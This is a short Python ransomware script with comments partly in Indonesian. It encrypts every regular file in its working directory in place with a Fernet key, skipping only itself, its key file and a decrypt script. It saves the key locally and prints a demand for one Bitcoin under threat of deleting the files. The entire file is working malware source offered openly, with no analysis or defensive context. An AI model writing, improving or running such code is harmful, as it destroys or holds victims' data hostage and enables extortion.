#!/usr/bin/env python3
#to change the description of the ransomware, you can simply change the print function on line 35
#btw "kunci" is "key" in english

import os
from cryptography.fernet import Fernet


#cari beberapa files ygy


files = []

for file in os.listdir():
	if file == "ransomware.py" or file == "kunci.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)


key = Fernet.generate_key()

with open("kunci.key", "wb") as kunci:
	kunci.write(key)


for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)


print("Send me 1 Bitcoin, or i'll delele all of your files :)")
